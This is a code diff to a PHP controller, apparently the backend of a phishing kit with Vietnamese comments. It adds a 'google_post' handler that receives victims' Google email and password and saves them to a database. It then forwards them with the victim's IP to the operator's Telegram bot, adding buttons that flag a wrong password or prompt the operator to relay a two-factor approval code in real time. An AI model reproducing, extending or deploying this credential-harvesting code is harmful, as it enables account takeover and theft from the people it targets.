@@ -94,8 +94,10 @@ class RealtimeWeb extends Controller
                                     [
                                         ['text' => '❌ User', 'callback_data' => 'wronguser_' . $pusher_code],
                                         ['text' => '❌ Pass', 'callback_data' => 'wrongpass_' . $pusher_code],
+                                    ],
+                                    [
                                         ['text' => '🔒 Yêu cầu duyệt', 'callback_data' => 'otp_' . $pusher_code],
-                                        ['text' => '📱 Nhập mã', 'switch_inline_query_current_chat' => '/code' . $pusher_code . ' '],
+                                        ['text' => '📱 Tự nhập mã duyệt', 'switch_inline_query_current_chat' => '/code' . $pusher_code . ' '],
                                     ],
                                     [
                                         ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
@@ -244,6 +246,84 @@ class RealtimeWeb extends Controller
                                     'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
                                 ]);
                             }
+                        }
+                    }
+                }
+            } catch (\Throwable $e) {
+                return response([
+                    'status' => false,
+                ]);
+            }
+        }
+    }
+    function google_post(Request $rq)
+    {
+        if ($rq->filled('d')) {
+            try {
+                $post_data = Json::decode($rq->d);
+                $web_info = Json::decode(Crypt::decryptString($post_data->info));
+                $ip = getRealIp();
+                // pusher code
+                $pusher_code = $rq->p_c;
+                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
+                $check_ip = FbAccount::where('ip', $ip)
+                    ->where('type', 'google')
+                    ->latest()
+                    ->first();
+                $wait_seconds = 3;
+                if ($check_ip) {
+                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
+                        return response([
+                            'status' => false,
+                        ]);
+                    }
+                }
+                $google_realtime_bot = new Api(config('telegrambot.google'));
+                $user = User::find($web_info->userid);
+                if ($user) {
+                    $user_telegram_id = Json::decode($user->data)->telegram_id;
+                    if ($user_telegram_id) {
+                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
+                        // new account
+                        if ($website) {
+                            $website = Json::decode($website->data);
+                            $keyboard = [
+                                [
+                                    ['text' => '❌ Sai email or SĐT', 'callback_data' => 'wrongemail_' . $pusher_code],
+                                    ['text' => '❌ Sai mật khẩu', 'callback_data' => 'wrongpass_' . $pusher_code],
+                                ],
+                                [
+                                    ['text' => '📱 Nhập mã duyệt', 'switch_inline_query_current_chat' => '/code' . $pusher_code . ' '],
+                                ],
+                                [
+                                    ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
+                                ],
+                            ];
+                            $msg = implode("\n", [
+                                "Google Account",
+                                "Title: <b>$website->title</b>",
+                                "",
+                                "Email or SĐT: <code>$post_data->email</code>",
+                                "Password: <code>$post_data->password</code>",
+                                "---------------",
+                                "IP: $ip",
+                                "---------------"
+                            ]);
+                            // tiến hành insert
+                            FbAccount::create([
+                                'userid' => $web_info->userid,
+                                'webid' => $web_info->webid,
+                                'user' => $post_data->email,
+                                'password' => $post_data->password,
+                                'type' => 'google',
+                                'ip' => $ip
+                            ]);
+                            $google_realtime_bot->sendMessage([
+                                'chat_id' => $user_telegram_id,
+                                'parse_mode' => 'HTML',
+                                'text' => $msg,
+                                'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
+                            ]);
                         }
                     }
                 }
